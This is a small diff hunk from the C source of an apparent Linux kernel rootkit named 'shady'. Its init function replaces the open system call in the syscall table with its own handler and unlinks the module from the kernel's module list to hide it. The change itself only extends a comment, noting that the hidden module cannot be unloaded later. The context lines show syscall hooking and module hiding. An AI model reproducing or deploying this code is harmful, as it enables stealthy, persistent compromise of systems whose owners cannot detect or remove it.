@@ -291,7 +291,7 @@ shady_init_module(void)
   system_call_table_address[__NR_open] = my_open;
 
   /*=======to hide this module=======*/
-  /*delete the module from modules list*/
+  /*delete the module from modules list. Unable to remove the module later!!!*/
   list_del_init(&__this_module.list); 
   
   return 0; /* success */
